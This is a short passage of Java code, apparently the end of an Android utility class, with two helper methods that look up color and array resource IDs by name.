    public static int getColorId(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString,
                "color", paramContext.getPackageName());
    }

    public static int getArrayId(Context paramContext, String paramString) {
        return paramContext.getResources().getIdentifier(paramString,
                "array", paramContext.getPackageName());
    }

}
